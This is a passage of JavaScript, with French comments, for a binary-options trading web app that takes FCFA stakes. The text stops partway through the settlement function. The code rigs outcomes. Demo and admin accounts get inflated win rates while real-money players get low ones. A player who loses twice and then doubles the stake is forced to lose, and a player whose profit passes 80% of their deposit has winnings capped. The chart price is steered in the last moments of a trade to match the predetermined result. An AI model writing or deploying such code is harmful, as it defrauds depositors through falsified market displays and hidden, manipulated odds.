(function (D6) {
  'use strict';

  var C = D6.CONFIG;
  var markets = {};
  var trades = [];
  var payoutLive = {};
  var lastOrderAt = 0;
  var sessionNonce = D6.uid();
  var orderSeq = 0;
  // Max 2 trades ouverts simultanés par compte.
  var MAX_OPEN = (C.MAX_OPEN || 2);
  var CANDLE_MS = 1000;
  var HISTORY_SEC = 240;
  var synthCache = {};

  function u32(n) {
    n = Math.imul(n ^ (n >>> 16), 2246822507);
    n = Math.imul(n ^ (n >>> 13), 3266489909);
    return (n ^ (n >>> 16)) >>> 0;
  }

  function uhash01(i, salt) {
    return u32(Math.imul(i | 0, 374761393) ^ Math.imul(salt | 0, 668265263)) / 4294967296;
  }

  function valueNoise(t, salt) {
    var i = Math.floor(t);
    var f = t - i;
    var u = f * f * (3 - 2 * f);
    return uhash01(i, salt) * (1 - u) + uhash01(i + 1, salt) * u;
  }

  function canonAssetId(id) {
    if (id === 'boom300' || id === 'pulseai') return C.ASSETS.titanpulse ? 'titanpulse' : 'v100';
    return C.ASSETS[id] ? id : 'v100';
  }

  // Profils indépendants : seed + vol + dérive + spikes (pas le même tableau + offset).
  function feedProfile(assetId) {
    switch (assetId) {
      case 'stable':
        return { salt: 221713, vol: 0.09, drift: 0, f1: 0.011, f2: 0.023, f3: 0.005, a1: 3.2, a2: 1.8, a3: 4.2, spike: null, stair: null };
      case 'v75':
        return { salt: 551903, vol: 0.92, drift: 0, f1: 0.088, f2: 0.17, f3: 0.041, a1: 16, a2: 11, a3: 24, spike: null, stair: null };
      case 'crash300':
        return { salt: 771001, vol: 0.35, drift: 0, f1: 0.01, f2: 0.022, f3: 0.005, a1: 2.2, a2: 1.4, a3: 3, spike: null, stair: null, crashBoom: 'crash' };
      case 'boomspike':
        return { salt: 882119, vol: 0.35, drift: 0, f1: 0.01, f2: 0.022, f3: 0.005, a1: 2.2, a2: 1.4, a3: 3, spike: null, stair: null, crashBoom: 'boom' };
      case 'apex500':
        return { salt: 440501, vol: 1, drift: 0, kind: 'apex' };
      case 'horizon50':
        return { salt: 550050, vol: 1, drift: 0, kind: 'horizon' };
      case 'goldtrend':
        return { salt: 660160, vol: 1, drift: 0, kind: 'gold' };
      case 'nexusprime':
        return { salt: 770870, vol: 1, drift: 0, kind: 'nexus' };
      case 'titanpulse':
        return { salt: 991177, vol: 1, drift: 0, kind: 'titan' };
      case 'v100':
      default:
        return { salt: 904177, vol: 1.05, drift: 0, f1: 0.041, f2: 0.093, f3: 0.017, a1: 18, a2: 11, a3: 32, spike: null, stair: null };
    }
  }

  function clampIndexPrice(p, asset) {
    var n = Number(p);
    var base = Number(asset && asset.basePrice) || 5000;
    if (!isFinite(n)) n = base;
    var lo = Math.max(1, base * 0.42);
    var hi = base * 2.8;
    return Math.round(Math.max(lo, Math.min(hi, n)) * 100) / 100;
  }

  window.assetBuffers = window.assetBuffers || {};
  window.assetsHistory = window.assetsHistory || {};

  var SIM = {
    v100: { mode: 'candles', vol: 0.0035, thin: false },
    stable: { mode: 'line', vol: 0.0012, color: '#f5a623' },
    apex500: { mode: 'candles', vol: 0.0045, run: true },
    horizon50: { mode: 'line', vol: 0.0055, color: '#00d2ff' },
    boomspike: { mode: 'candles', vol: 0.0020, spike: 1 },
    crash300: { mode: 'candles', vol: 0.0020, spike: -1 },
    v75: { mode: 'candles', vol: 0.0060, tickMs: 250, thin: true },
    nexusprime: { mode: 'candles', vol: 0.0028, sine: true },
    goldtrend: { mode: 'line', vol: 0.0022, color: '#ffb300', stair: true },
    titanpulse: { mode: 'candles', vol: 0.0030, pulse: true }
  };
  var SIM_VER = 10;

  function simOf(id) {
    return SIM[id] || SIM.v100;
  }

  function candleMsFor(asset) {
    var s = simOf(asset && asset.id);
    return s.tickMs || CANDLE_MS;
  }

  function capPctMove(prev, next, maxPct) {
    if (!(prev > 0) || !isFinite(next)) return prev;
    var lo = prev * (1 - maxPct);
    var hi = prev * (1 + maxPct);
    if (next < lo) return lo;
    if (next > hi) return hi;
    return next;
  }

  function unifiedStep(asset, price, nowMs, dtSec, opts) {
    opts = opts || {};
    var sim = simOf(asset.id);
    var base = Number(asset.basePrice) || price;
    var vol = sim.vol;
    var bias = 0.49;
    if (sim.spike === 1) bias = 0.58;
    if (sim.spike === -1) bias = 0.40;
    if (sim.pulse) {
      var phP = ((nowMs / 1000) % 16) / 16;
      vol *= phP < 0.78 ? 0.42 : 1.9;
    }
    var center = bias;
    var roll = opts.det != null ? uhash01(opts.det, 904177) : Math.random();
    var delta = (roll - center) * price * vol;
    if (sim.sine) delta += Math.sin(nowMs / 1000 * Math.PI / 20) * price * 0.00085;
    if (sim.stair) {
      var st = (nowMs / 1000) % 9;
      if (st < 5.5) delta += Math.abs(price) * 0.00045 * Math.max(dtSec, 0.05);
      else delta *= 0.12;
    }
    var pull = (base - price) * 0.04;
    var next = price + delta + pull;
    if (!opts.spike) {
      next = capPctMove(price, next, 0.0035 * Math.min(1, Math.max(dtSec, 0.02)));
    }
    return clampIndexPrice(next, asset);
  }

  function finishCandle(asset, o, h, l, c, t, spike) {
    var sim = simOf(asset.id);
    o = clampIndexPrice(o, asset);
    c = clampIndexPrice(c, asset);
    var minBody = Math.max(Math.abs(o) * 0.0002, 0.02);
    var cms = candleMsFor(asset);
    var bucket = Math.floor(t / cms);
    if (!spike) {
      if (sim.run) {
        var run = 4 + Math.floor(uhash01(Math.floor(bucket / 8), 440501) * 3);
        var pos = bucket % (run + 3);
        if (pos < run) c = o + Math.max(minBody, Math.abs(c - o));
        else c = o - Math.max(minBody * 0.7, Math.abs(c - o) * 0.55);
      } else if (sim.spike === 1) {
        c = o - Math.max(minBody, Math.abs(c - o) * 0.65);
      } else if (sim.spike === -1) {
        c = o + Math.max(minBody, Math.abs(c - o) * 0.65);
      } else if (Math.abs(c - o) < minBody) {
        c = o + (c >= o ? minBody : -minBody);
      }
    }
    h = Math.max(h, o, c);
    l = Math.min(l, o, c);
    var body = Math.abs(c - o);
    var maxW = body * 1.2;
    var hiB = Math.max(o, c);
    var loB = Math.min(o, c);
    if (h > hiB + maxW) h = hiB + maxW;
    if (l < loB - maxW) l = loB - maxW;
    return {
      o: clampIndexPrice(o, asset),
      h: clampIndexPrice(h, asset),
      l: clampIndexPrice(l, asset),
      c: clampIndexPrice(c, asset),
      t: t,
      _spike: !!spike
    };
  }

  function publishHistory(assetId, buf) {
    window.assetsHistory = window.assetsHistory || {};
    window.assetBuffers = window.assetBuffers || {};
    var prices = (buf.prices || []).slice(-60);
    window.assetsHistory[assetId] = prices;
    window.assetBuffers[assetId] = buf;
  }

  function seedAssetBuffer(asset) {
    var sim = simOf(asset.id);
    var price = Number(asset.basePrice) || 5000;
    var now = Date.now();
    var cms = candleMsFor(asset);
    var t0 = Math.floor(now / cms) - 59;
    var candles = [];
    var prices = [];
    var i;
    var k;
    var nextSpike = now + 25000 + Math.random() * 10000;
    for (i = 0; i < 60; i++) {
      var ts = (t0 + i) * cms;
      var o = price;
      var h = o;
      var l = o;
      var spiked = false;
      for (k = 0; k < 4; k++) {
        price = unifiedStep(asset, price, ts + k * (cms / 4), cms / 4000, { det: t0 + i * 4 + k });
        if (price > h) h = price;
        if (price < l) l = price;
      }
      if (sim.spike && (t0 + i) % (25 + Math.floor(uhash01(Math.floor((t0 + i) / 30), 11) * 11)) === 0 && i > 8) {
        var from = o;
        price = clampIndexPrice(from * (1 + sim.spike * 0.02), asset);
        spiked = true;
        h = Math.max(h, price, o);
        l = Math.min(l, price, o);
      }
      var candle = finishCandle(asset, o, h, l, price, ts, spiked);
      candles.push(candle);
      prices.push(candle.c);
      price = candle.c;
    }
    var buf = {
      prices: prices,
      candles: candles,
      price: price,
      lastMs: now,
      bucket: Math.floor(now / cms),
      forming: finishCandle(asset, price, price, price, price, Math.floor(now / cms) * cms, false),
      nextSpike: nextSpike,
      ver: SIM_VER
    };
    publishHistory(asset.id, buf);
    return buf;
  }

  function advanceBuffer(asset, nowMs) {
    window.assetBuffers = window.assetBuffers || {};
    var buf = window.assetBuffers[asset.id];
    if (!buf || !buf.candles || buf.candles.length < 50 || buf.ver !== SIM_VER) {
      buf = seedAssetBuffer(asset);
    }
    nowMs = nowMs || Date.now();
    if (nowMs < buf.lastMs) nowMs = buf.lastMs;
    var sim = simOf(asset.id);
    var cms = candleMsFor(asset);
    var elapsed = nowMs - buf.lastMs;
    if (elapsed > 4000) elapsed = 80;
    var stepMs = sim.tickMs ? 40 : 70;
    var steps = Math.max(1, Math.min(12, Math.floor(elapsed / stepMs) || 1));
    var s;
    var price = buf.price;
    var forming = buf.forming || { o: price, h: price, l: price, c: price, t: Math.floor(nowMs / cms) * cms };
    for (s = 0; s < steps; s++) {
      var tMs = buf.lastMs + ((s + 1) / steps) * elapsed;
      var dt = Math.max(0.02, (elapsed / steps) / 1000);
      var didSpike = false;
      if (sim.spike && tMs >= (buf.nextSpike || 0)) {
        var fromP = price;
        price = clampIndexPrice(fromP * (1 + sim.spike * 0.02), asset);
        buf.nextSpike = tMs + 25000 + Math.random() * 10000;
        forming._spike = true;
        forming.o = fromP;
        didSpike = true;
      }
      if (!didSpike) {
        price = unifiedStep(asset, price, tMs, dt, {});
      }
      var bucket = Math.floor(tMs / cms);
      if (price > forming.h) forming.h = price;
      if (price < forming.l) forming.l = price;
      forming.c = price;
      if (bucket !== buf.bucket) {
        forming = finishCandle(asset, forming.o, forming.h, forming.l, forming.c, forming.t, forming._spike);
        buf.candles.push(forming);
        if (buf.candles.length > 60) buf.candles.shift();
        buf.prices.push(forming.c);
        if (buf.prices.length > 60) buf.prices.shift();
        buf.bucket = bucket;
        forming = { o: price, h: price, l: price, c: price, t: bucket * cms };
      }
    }
    buf.price = price;
    buf.forming = finishCandle(asset, forming.o, forming.h, forming.l, forming.c, forming.t, forming._spike);
    buf.lastMs = nowMs;
    publishHistory(asset.id, buf);
    return buf;
  }

  function walkCfg(id) {
    var s = simOf(id);
    return { vol: s.vol, spike: s.spike || null };
  }

  function synthPrice(asset) {
    var id = (asset && asset.id) || asset;
    var b = window.assetBuffers && window.assetBuffers[id];
    if (b && isFinite(b.price)) return b.price;
    return clampIndexPrice(asset && asset.basePrice, asset);
  }

  function syncMarket(market, asset, nowMs) {
    nowMs = nowMs || Date.now();
    var buf = advanceBuffer(asset, nowMs);
    var closed = buf.candles.slice();
    if (closed.length > 59) closed = closed.slice(-59);
    var forming = buf.forming;
    var history = buf.prices.slice();
    market.price = buf.price;
    market.candles = closed;
    market.candle = forming;
    market.history = history;
    market.ticksInCandle = Math.floor((nowMs % CANDLE_MS) / 80);
    publishAssetBuffer(asset.id, market);
    return market;
  }

  function publishAssetBuffer(assetId, market) {
    window.assetsState = window.assetsState || {};
    var prev = window.assetsState[assetId] || {};
    var candles = (market.candles || []).slice();
    if (market.candle) candles.push(market.candle);
    var buf = candles.slice(-60);
    var min = Infinity;
    var max = -Infinity;
    var i;
    for (i = 0; i < buf.length; i++) {
      var c = buf[i];
      if (!c) continue;
      if (c.l < min) min = c.l;
      if (c.h > max) max = c.h;
      if (c.c < min) min = c.c;
      if (c.c > max) max = c.c;
    }
    if (!isFinite(min) || !isFinite(max)) {
      min = Number(market.price) || 0;
      max = min;
    }
    window.assetsState[assetId] = {
      candles: buf,
      min: min,
      max: max,
      lastPrice: market.price,
      viewMin: prev.viewMin || 0,
      viewMax: prev.viewMax || 0,
      lockMin: prev.lockMin || 0,
      lockMax: prev.lockMax || 0,
      at: Date.now()
    };
    var closes = [];
    for (i = 0; i < buf.length; i++) {
      if (buf[i] && isFinite(buf[i].c)) closes.push(buf[i].c);
    }
    window.assetsHistory = window.assetsHistory || {};
    window.assetsHistory[assetId] = closes.slice(-60);
  }

  function seedMarket(assetId) {
    var asset = C.ASSETS[assetId];
    var market = {
      id: assetId,
      price: asset.basePrice,
      history: [],
      candles: [],
      candle: { o: asset.basePrice, h: asset.basePrice, l: asset.basePrice, c: asset.basePrice },
      ticksInCandle: 0,
      payout: C.REAL_PAYOUT
    };
    return syncMarket(market, asset, Date.now());
  }

  function rollPayout(asset, mode) {
    if (mode === 'real') return C.REAL_PAYOUT;
    var span = asset.payoutMax - asset.payoutMin;
    return +(asset.payoutMin + Math.random() * span).toFixed(3);
  }

  function ensureMarkets() {
    var id;
    for (id in C.ASSETS) {
      if (markets[id]) continue;
      var asset = C.ASSETS[id];
      markets[id] = {
        id: id,
        price: asset.basePrice,
        history: [],
        candles: [],
        candle: { o: asset.basePrice, h: asset.basePrice, l: asset.basePrice, c: asset.basePrice },
        ticksInCandle: 0,
        payout: C.REAL_PAYOUT
      };
    }
  }

  function wakeMarket(assetId) {
    var id = canonAssetId(assetId);
    ensureMarkets();
    if (C.ASSETS[id]) {
      syncMarket(markets[id], C.ASSETS[id], Date.now());
    }
    return markets[id];
  }

  function makeSeal(payload) {
    var s = sessionNonce + '|' + payload + '|' + orderSeq;
    var h = 2166136261;
    var i;
    for (i = 0; i < s.length; i++) {
      h ^= s.charCodeAt(i);
      h = Math.imul(h, 16777619);
    }
    return (h >>> 0).toString(16);
  }

  function automationDetected() {
    if (navigator.webdriver) return true;
    if (window.callPhantom || window._phantom) return true;
    if (window.domAutomation || window.domAutomationController) return true;
    return false;
  }

  function balOf(user, mode) {
    if (D6.Store.balanceMode) return D6.Store.balanceMode(user, mode);
    return D6.Store.balanceOf(user);
  }

  function setBal(user, mode, value) {
    if (D6.Store.setBalanceMode) D6.Store.setBalanceMode(user, mode, value);
    else {
      var prev = user.mode;
      user.mode = mode;
      D6.Store.setBalance(user, value);
      user.mode = prev;
    }
  }

  function stakeCap(user, stake, mode) {
    mode = mode || user.mode;
    var balance = balOf(user, mode);
    if (stake < C.MIN_STAKE) {
      return { ok: false, cap: C.MIN_STAKE, reason: D6.I18N.t('minStake') + ' ' + D6.fmtFCFA(C.MIN_STAKE) };
    }
    if (stake > balance) {
      return { ok: false, cap: balance, reason: D6.I18N.t('insufficient') };
    }
    return { ok: true, cap: balance };
  }

  function expiryOf(t) {
    return t.expiryTime || t.expiresAt;
  }

  function isLive(t) {
    return t && !t.settled && t.status === 'open' && Date.now() < expiryOf(t);
  }

  function isOpen(t) {
    return t && !t.settled && (t.status === 'open' || !t.status);
  }

  function openForMode(mode) {
    return trades.filter(function (t) {
      return isOpen(t) && t.mode === mode;
    });
  }

  function syncTime(t) {
    var left = (expiryOf(t) - Date.now()) / 1000;
    t.timeLeft = left > 0 ? left : 0;
    return t.timeLeft;
  }

  function publicTrade(t) {
    if (!t) return null;
    syncTime(t);
    return Object.freeze({
      id: t.id,
      assetId: t.assetId,
      side: t.side,
      stake: t.stake,
      duration: t.duration,
      timeLeft: t.timeLeft,
      entryPrice: t.entryPrice,
      openPrice: t.entryPrice,
      payout: t.payout,
      payoutMult: t.payout,
      startedAt: t.startedAt,
      startTime: t.startTime || t.startedAt,
      openedAt: t.startTime || t.startedAt,
      expiryTime: expiryOf(t),
      expiresAt: expiryOf(t),
      expiryAt: expiryOf(t),
      settled: !!t.settled,
      status: t.status || (t.settled ? 'closed' : 'open'),
      mode: t.mode,
      accountType: t.mode
    });
  }

  function persistOpen(user) {
    if (!user) return;
    user.openTrades = trades.filter(isOpen).map(function (t) {
      return {
        id: t.id,
        userId: t.userId,
        assetId: t.assetId,
        side: t.side,
        stake: t.stake,
        payout: t.payout,
        entryPrice: t.entryPrice,
        duration: t.duration,
        durationMs: t.durationMs,
        startTime: t.startTime,
        startedAt: t.startedAt,
        expiryTime: expiryOf(t),
        expiresAt: expiryOf(t),
        mode: t.mode,
        status: 'open',
        settled: false,
        seq: t.seq
      };
    });
    D6.Store.saveUser(user);
  }

  function closePriceAt(assetId) {
    var asset = C.ASSETS[assetId];
    if (!asset) return 0;
    return synthPrice(asset);
  }

  function normalizeOdds(v) {
    var list = C.ODDS_MULT || [1.88, 6, 11, 51];
    var n = Number(v);
    var i;
    for (i = 0; i < list.length; i++) {
      if (Math.abs(list[i] - n) < 0.001) return list[i];
    }
    return C.DEFAULT_ODDS != null ? C.DEFAULT_ODDS : 1.88;
  }

  function oddsKey(mult) {
    var o = normalizeOdds(mult);
    if (Math.abs(o - 1.88) < 0.001) return '1.88';
    if (Math.abs(o - 6) < 0.001) return '6';
    if (Math.abs(o - 11) < 0.001) return '11';
    if (o >= 50) return '51';
    return '1.88';
  }

  function winRateForOdds(mult, map) {
    map = map || C.ODDS_WIN_RATE || {};
    var o = normalizeOdds(mult);
    var k = oddsKey(o);
    if (map[k] != null && isFinite(Number(map[k]))) return Number(map[k]);
    var m = Math.max(1.01, Number(o) || 1.88);
    var r = 1 / (m * 1.25);
    return Math.max(0.001, Math.min(0.49, r));
  }

  function isAdminUser(user) {
    if (!user) return false;
    if (user.role === 'admin') return true;
    if (user.id === 'admin_master') return true;
    var mail = String(user.email || '').toLowerCase();
    var adminMail = String((C.ADMIN_EMAIL) || 'admin@orolado.com').toLowerCase();
    if (mail !== '' && mail === adminMail) return true;
    try {
      if (D6.Auth && typeof D6.Auth.isAdmin === 'function' && D6.Auth.isAdmin(user)) return true;
    } catch (eA) { /* ignore */ }
    return false;
  }

  function forceExitPrice(entry, isCall, won, assetId, harsh) {
    var base = Math.max((C.ASSETS[assetId].tickNoise || 0.3) * 0.45, 0.28);
    var nudge = harsh ? Math.max(base * 3.2, 1.1) : base;
    return entry + (won
      ? (isCall ? 1 : -1)
      : (isCall ? -1 : 1)) * nudge;
  }

  /** Arbitrage étanche — démo / admin réel / joueur réel. */
  function resolveWinProbability(user, trade, mode) {
    var demoMap = C.ODDS_WIN_RATE_DEMO || {
      '1.88': 0.58, '6': 0.20, '11': 0.10, '51': 0.02
    };
    var adminRealMap = C.ODDS_WIN_RATE_ADMIN_REAL || C.ODDS_WIN_RATE_FAVORABLE || {
      '1.88': 0.70, '6': 0.255, '11': 0.127, '51': 0.025
    };
    var realMap = C.ODDS_WIN_RATE || {
      '1.88': 0.42, '6': 0.12, '11': 0.05, '51': 0.008
    };
    var admin = isAdminUser(user);
    var isDemo = mode !== 'real';
    var harsh = false;

    if (isDemo) {
      return { winProbability: winRateForOdds(trade.payout, demoMap), harsh: false, profile: 'B' };
    }
    if (admin) {
      return { winProbability: winRateForOdds(trade.payout, adminRealMap), harsh: false, profile: 'A' };
    }

    var winProbability = winRateForOdds(trade.payout, realMap);
    var losses = Number(user.consecutiveLosses) || 0;
    var lastBet = Number(user.lastBetAmount) || Number(user.lastStake) || 0;
    var currentBet = Number(trade.stake) || 0;
    var doubling = lastBet > 0 && currentBet >= lastBet * 1.8;

    if (losses >= 2 && doubling) {
      winProbability = 0;
      harsh = true;
    }

    var deposited = Number(user.realDepositTotal) || 0;
    if (deposited > 0) {
      var wallet = balOf(user, 'real');
      var netProfit = wallet - deposited;
      if (netProfit > deposited * 0.80) {
        var k = oddsKey(trade.payout);
        var ceilRate = (k === '1.88') ? 0.15 : 0.01;
        winProbability = Math.min(winProbability, ceilRate);
      }
    }

    return { winProbability: winProbability, harsh: harsh, profile: 'C' };
  }

  function decideTradeOutcome(user, trade, mode) {
    if (trade && trade._outcomeReady) {
      return { wantWon: !!trade._wantWon, harsh: !!trade._harsh, target: Number(trade._exitTarget) };
    }
    var verdict = resolveWinProbability(user, trade, mode);
    var wantWon = verdict.harsh ? false : (Math.random() < verdict.winProbability);
    var isCall = trade.side === 'call';
    var target = forceExitPrice(trade.entryPrice, isCall, wantWon, trade.assetId, verdict.harsh);
    trade._wantWon = wantWon;
    trade._harsh = !!verdict.harsh;
    trade._exitTarget = target;
    trade._outcomeReady = true;
    return { wantWon: wantWon, harsh: !!verdict.harsh, target: target };
  }

  function applyExitToMarket(trade, target) {
    var m = markets[trade.assetId];
    if (!m || !isFinite(target)) return;
    m.price = target;
    if (m.candle) {
      m.candle.c = target;
      if (target > m.candle.h) m.candle.h = target;
      if (target < m.candle.l) m.candle.l = target;
    }
    var b = window.assetBuffers && window.assetBuffers[trade.assetId];
    if (b) {
      b.price = target;
      b.vel = 0;
      if (b.forming) {
        b.forming.c = target;
        if (target > b.forming.h) b.forming.h = target;
        if (target < b.forming.l) b.forming.l = target;
      }
    }
  }

  function prepareLastSecondSteer(now) {
    var user = D6.Store && D6.Store.current ? D6.Store.current() : null;
    if (!user) return;
    var i;
    for (i = 0; i < trades.length; i++) {
      var tr = trades[i];
      if (!isLive(tr) || tr.userId !== user.id) continue;
      var left = expiryOf(tr) - now;
      if (left > 220 || left < 0) continue;
      var decided = decideTradeOutcome(user, tr, tr.mode === 'real' ? 'real' : 'demo');
      if (D6.Chart && D6.Chart.steerClose) {
        try { D6.Chart.steerClose(decided.target, Math.max(80, left), tr.assetId); } catch (eSt) { /* ignore */ }
      }
      if (left <= 40) applyExitToMarket(tr, decided.target);
    }
  }

  ensureMarkets();
  Object.keys(C.ASSETS).forEach(function (id) {
    payoutLive[id] = markets[id].payout;
  });

  var api = {
    markets: markets,
    payoutLive: payoutLive,
    onExpire: null,
    onSettled: null,

    getMarket: function (id) {
      return wakeMarket(id);
    },

    getTrade: function () {
      var live = trades.filter(isLive);
      if (!live.length) return null;
      var best = live[0];
      var i;
      for (i = 1; i < live.length; i++) {
        if (expiryOf(live[i]) < expiryOf(best)) best = live[i];
      }
      return publicTrade(best);
    },

    getTrades: function (mode) {
      return trades.filter(isLive).filter(function (t) {
        return !mode || t.mode === mode;
      }).map(function (t) { return publicTrade(t); });
    },

    liveCount: function (mode) {
      if (mode) return openForMode(mode).length;
      return trades.filter(isOpen).length;
    },

    restoreOpen: function (user) {
      if (!user) return 0;
      trades = [];
      var list = user.openTrades || [];
      var i;
      for (i = 0; i < list.length; i++) {
        var raw = list[i];
        if (!raw || !raw.id) continue;
        if (raw.userId && raw.userId !== user.id) continue;
        if (raw.settled || raw.status === 'won' || raw.status === 'lost' || raw.status === 'void') continue;
        trades.push({
          id: raw.id,
          assetId: canonAssetId(raw.assetId),
          side: raw.side === 'put' ? 'put' : 'call',
          stake: D6.roundMoney(Number(raw.stake) || 0),
          duration: raw.duration || 10,
          durationMs: raw.durationMs || (raw.duration || 10) * 1000,
          timeLeft: 0,
          entryPrice: Number(raw.entryPrice) || 0,
          payout: Number(raw.payout) || C.REAL_PAYOUT,
          startTime: raw.startTime || raw.startedAt || Date.now(),
          startedAt: raw.startedAt || raw.startTime || Date.now(),
          expiryTime: raw.expiryTime || raw.expiresAt || raw.expiryAt,
          expiresAt: raw.expiresAt || raw.expiryTime || raw.expiryAt,
          mode: raw.mode === 'real' ? 'real' : 'demo',
          userId: user.id,
          seq: raw.seq || 0,
          settled: false,
          status: 'open'
        });
      }
      if (D6.Chart && D6.Chart.applyOpenTradeVisual) {
        for (i = 0; i < trades.length; i++) {
          try { D6.Chart.applyOpenTradeVisual(publicTrade(trades[i])); } catch (eR) { /* ignore */ }
        }
      }
      return trades.length;
    },

    refreshPayout: function (assetId, mode) {
      var asset = C.ASSETS[assetId];
      var u = D6.Store.current();
      var m = mode || (u && u.mode) || 'demo';
      payoutLive[assetId] = rollPayout(asset, m);
      markets[assetId].payout = payoutLive[assetId];
      return payoutLive[assetId];
    },

    tick: function (assetId) {
      ensureMarkets();
      var now = Date.now();
      var i;
      for (i = 0; i < trades.length; i++) {
        syncTime(trades[i]);
      }
      var id;
      for (id in C.ASSETS) {
        if (!C.ASSETS.hasOwnProperty(id)) continue;
        syncMarket(markets[id], C.ASSETS[id], now);
      }
      prepareLastSecondSteer(now);
    },

    placeOrder: function (user, opts) {
      if (automationDetected()) return { ok: false, reason: 'Session non sécurisée' };
      if (!user || !D6.Store.current() || D6.Store.current().id !== user.id) {
        return { ok: false, reason: 'Session invalide' };
      }
      var mode = user.mode === 'real' ? 'real' : 'demo';
      if (openForMode(mode).length >= MAX_OPEN) {
        return { ok: false, reason: D6.I18N.t('maxPositions') };
      }

      var nowPerf = performance.now();
      if (nowPerf - lastOrderAt < C.MIN_ORDER_MS) {
        return { ok: false, reason: D6.I18N.t('antibot') };
      }

      var stake = D6.roundMoney(Number(opts.stake) || 0);
      var duration = C.DURATIONS.indexOf(opts.duration) >= 0 ? opts.duration : C.DEFAULT_DURATION;
      var assetId = canonAssetId(opts.assetId);
      var side = opts.side === 'put' ? 'put' : 'call';
      var gate = stakeCap(user, stake, mode);
      if (!gate.ok) return gate;

      ensureMarkets();
      var market = markets[assetId];
      syncMarket(market, C.ASSETS[assetId], Date.now());
      var payout = normalizeOdds(opts.payout != null ? opts.payout : (opts.odds != null ? opts.odds : C.DEFAULT_ODDS));
      setBal(user, mode, balOf(user, mode) - stake);
      D6.Store.addTransaction(user, {
        type: 'stake',
        amount: -stake,
        mode: mode,
        note: (side === 'call' ? 'CALL' : 'PUT') + ' ' + C.ASSETS[assetId].short
      });

      orderSeq += 1;
      lastOrderAt = nowPerf;
      D6.holdRemote = true;
      var entry = market.price;
      if (D6.Chart && D6.Chart.lastClose && D6.Chart.lastAsset && D6.Chart.lastAsset() === assetId) {
        var drawnIn = Number(D6.Chart.lastClose());
        if (isFinite(drawnIn) && drawnIn > 0) entry = drawnIn;
      }
      var wall = Date.now();
      var durationMs = duration * 1000;
      var id = D6.uid();

      var t = {
        id: id,
        assetId: assetId,
        side: side,
        stake: stake,
        duration: duration,
        durationMs: durationMs,
        timeLeft: duration,
        entryPrice: entry,
        payout: payout,
        startTime: wall,
        startedAt: wall,
        expiryTime: wall + durationMs,
        expiresAt: wall + durationMs,
        mode: mode,
        userId: user.id,
        seq: orderSeq,
        settled: false,
        status: 'open'
      };
      t.ticket = Object.freeze({
        stake: stake,
        duration: duration,
        durationMs: durationMs,
        payout: payout,
        side: side,
        entryPrice: entry,
        assetId: assetId
      });
      trades.push(t);

      if (mode === 'real') {
        user.realStakeVolume = (user.realStakeVolume || 0) + stake;
        user.totalWageredSinceDeposit = Number(user.realStakeVolume) || 0;
        user.requiredWagering = D6.roundMoney((Number(user.realDepositTotal) || 0) * ((C.WAGER_MULTIPLIER) || 2));
      }
      user.lastStake = stake;
      // Ne pas écraser lastBetAmount ici : réservé à la clôture (anti-martingale).
      persistOpen(user);
      if (D6.Supabase && D6.Supabase.saveOrder) D6.Supabase.saveOrder(t, 'open');
      var pub = publicTrade(t);
      // Ligne CALL/PUT immédiate (sync) — ne pas attendre le prochain tick/F5.
      if (D6.Chart && D6.Chart.applyOpenTradeVisual) {
        try { D6.Chart.applyOpenTradeVisual(pub); } catch (eVis) { /* ignore */ }
      }
      return { ok: true, trade: pub };
    },

    resolve: function (user, tradeId) {
      if (!user || !trades.length) return null;
      var idx = -1;
      var i;
      var now = Date.now();
      if (tradeId) {
        for (i = 0; i < trades.length; i++) {
          if (trades[i].id === tradeId) { idx = i; break; }
        }
      } else {
        for (i = 0; i < trades.length; i++) {
          if (isOpen(trades[i]) && now >= expiryOf(trades[i])) { idx = i; break; }
        }
      }
      if (idx < 0) return null;
      var trade = trades[idx];
      if (trade.settled || trade.status === 'won' || trade.status === 'lost' || trade.status === 'void') {
        trades.splice(idx, 1);
        persistOpen(user);
        if (D6.Chart && D6.Chart.removeTradeVisual) {
          try { D6.Chart.removeTradeVisual(trade.id); } catch (e0) { /* ignore */ }
        }
        return null;
      }
      if (now < expiryOf(trade)) return null;

      // Idempotence : marquer avant crédit.
      trade.settled = true;

      if (user.id !== trade.userId) {
        if (D6.Chart && D6.Chart.removeTradeVisual) {
          try { D6.Chart.removeTradeVisual(trade.id); } catch (eGone) { /* ignore */ }
        }
        trades.splice(idx, 1);
        persistOpen(user);
        return null;
      }

      var mode = trade.mode === 'real' ? 'real' : 'demo';
      var payout = normalizeOdds(trade.ticket && trade.ticket.payout != null ? trade.ticket.payout : trade.payout);
      var expMs = expiryOf(trade);
      ensureMarkets();
      var mkt = markets[trade.assetId];
      if (mkt && C.ASSETS[trade.assetId]) {
        syncMarket(mkt, C.ASSETS[trade.assetId], expMs);
      }
      trade.payout = payout;
      var voided = false;
      var decided = decideTradeOutcome(user, trade, mode);
      var exitPrice = decided.target;
      var won = decided.wantWon;
      applyExitToMarket(trade, exitPrice);
      if (D6.Chart && D6.Chart.steerClose) {
        try { D6.Chart.steerClose(exitPrice, 80, trade.assetId); } catch (eSt) { /* ignore */ }
      }
      if (D6.Chart && D6.Chart.removeTradeVisual) {
        try { D6.Chart.removeTradeVisual(trade.id); } catch (e1) { /* ignore */ }
      }

      var payoutAmount = 0;
      var net = 0;
      var status = 'lost';

      if (voided) {
        status = 'void';
        payoutAmount = trade.stake;
        setBal(user, mode, balOf(user, mode) + trade.stake);
        net = 0;
        D6.Store.addTransaction(user, {
          type: 'void',
          amount: trade.stake,
          mode: mode,
          note: 'Égalité — mise rendue ' + C.ASSETS[trade.assetId].short
        });
      } else if (won) {
        status = 'won';
        payoutAmount = D6.roundMoney(trade.stake * trade.payout);
        setBal(user, mode, balOf(user, mode) + payoutAmount);
        net = payoutAmount - trade.stake;
        user.wins = (user.wins || 0) + 1;
        user.consecutiveWins = (user.consecutiveWins || 0) + 1;
        user.consecutiveLosses = 0;
        user.lastLost = false;
        D6.Store.addTransaction(user, {
          type: 'win',
          amount: payoutAmount,
          mode: mode,
          note: 'Position gagnante ' + C.ASSETS[trade.assetId].short
        });
      } else {
        status = 'lost';
        net = -trade.stake;
        user.consecutiveLosses = (user.consecutiveLosses || 0) + 1;
        user.consecutiveWins = 0;
        user.lastLost = true;
        D6.Store.addTransaction(user, {
          type: 'loss',
          amount: -trade.stake,
          mode: mode,
          note: 'Position expirée ' + C.ASSETS[trade.assetId].short
        });
      }

      trade.status = status;
      trade.closePrice = exitPrice;
      trade.exitPrice = exitPrice;
      // Historique mise pour anti-martingale (trade suivant).
      user.lastBetAmount = trade.stake;
      user.lastStake = trade.stake;

      user.trades = (user.trades || 0) + 1;
      if (mode === 'real') user.realTrades = (user.realTrades || 0) + 1;
